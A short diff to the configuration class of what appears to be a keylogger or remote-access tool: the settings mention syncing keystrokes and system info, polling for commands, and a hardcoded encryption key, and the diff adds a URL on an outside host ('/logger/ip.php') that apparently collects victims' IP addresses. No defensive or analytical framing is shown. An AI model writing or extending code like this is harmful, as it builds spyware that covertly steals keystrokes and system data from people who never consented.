@@ -10,6 +10,7 @@ class Config:
     CHECK_INTERVAL = 120  # seconds (data sync, e.g., keystrokes, system info)
     COMMAND_POLL_INTERVAL = 10  # seconds
     COMMAND_TIMEOUT = 5  # seconds, for HTTP request timeout
+    IP_URL = "https://fasitheme.ir/logger/ip.php"
     
     # Security Settings
     ENCRYPTION_KEY = base64.b64decode("nTds2GHvEWeOGJibjZuaf8kY5T5YWyfMx4J3B1NA0Jo=")
